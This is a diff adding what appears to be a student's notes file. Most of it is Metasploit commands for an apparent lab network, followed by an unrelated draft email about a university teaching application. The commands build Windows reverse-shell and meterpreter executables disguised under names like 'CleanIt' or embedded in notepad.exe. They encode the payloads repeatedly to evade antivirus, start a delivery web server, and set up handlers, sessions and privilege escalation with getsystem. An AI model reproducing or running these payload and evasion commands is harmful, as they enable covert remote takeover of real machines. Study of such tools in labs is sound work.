@@ -1,0 +1,123 @@
+service postgresql start 
+---what does it do?
+service metasploit start
+---what does it do?
+
+msfconsole  
+---what does it do?
+db_status
+--check loaded or not
+
+db_nmap -sS 192.168.100.0/24 
+
+
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.100.200 LPORT=4444 X -e x86/jmp_call_additive -i 4 -k -f> CleanItFront3.exe
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.100.200 LPORT=4444 X -e x86/jmp_call_additive -i 4 -k -f> CleanItFront3.exe
+
+msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -e x86/jmp_call_additive -i 4
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.100.200 LPORT=4890 R | msfencode -t exe -o CleanITFront150.exe -e x86/shikata_ga_nai -c 10 
+
+
+see if 105 got caught or not, if not then change the venom codes to non venom codes
+
+\\
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.100.200 LPORT=4444 -f exe > CleanItFULL6900.exe
+
+--this one works, now just encode it
+
+msfvenom --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.100.200 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > CleanItFULL69099.exe
+
+msfvenom --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.100.200 LPORT=4440 -e x86/jmp_call_additive -i 10 -f exe > Cleanaddi4789.exe
+
+msfvenom --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.100.200 LPORT=4440 -x notepad.exe -e x86/jmp_call_additive -i 10 -k -f exe > Cleanallnotepad.exe
+
+
+platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
+Found 1 compatible encoders
+////
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.200 LPORT=4444 exe > CleanItFront.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.200 LPORT=4445 -e x86/jmp_call_additive -i 4 -k -f exe > CleanItBack.exe
+
+msf6 exploit(..) > show advanced
+msf6 exploit(..) > set EnableStageEncoding true
+msf6 exploit(..) > set StageEncoder x86/jmp_call_additive
+msf6 exploit(..) > run
+
+x64/xor 
+
+
+
+--explain how each part of the command works--including andcoder parts and stuff and why you used msfvenom
+
+
+
+
+python -m SimpleHTTPServer 80
+---what does it do?
+
+
+
+
+use multi/handler
+---what does it do?
+
+set venom windows/meterpreter/reverse_tcp
+
+use exploit multi/handler
+---what does it do?
+
+set payload windows/meterpreter/reverse_tcp
+---what does it do?
+set LHOST 192.168.100.200
+---what does it do?
+set LPORT 4444
+---what does it do?
+exploit -j
+---what does it do?
+
+
+sessions
+---what does it do?
+
+
+sessions -i 1
+---what does it do?
+
+getsystem
+---what does it do?
+
+
+
+
+Go to multi handler
+
+use windows/meterpreter/reverse_tcp
+
+
+show encoders
+
+x86/jmp_call_additive  
+
+
+put this in desktop
+meterpreter > shell> then enter the code
+
+echo Haha, you got pranked!  > lol.txt
+
+Hi Karina,
+
+I have noticed an email regarding Sessional Teching EOI for 2023. So, I was wondering if this was the application portal you were speaking about?
+
+If so, there are a few areas in that application, where I would be glad to have your advice. So will it be possible to have a consultation with you regarding that next week or so, whenever you are free?
+
+
+Things to ask Karina,
+am i a sessional employee?
+or HDR student and sessional employee?
+   basically, what does swinburne hdr student mean?
+   
+Currently my highest qualification is completion of A levels (which is grade 12 completion) and currently i am doing bachelors but have not completed it yet
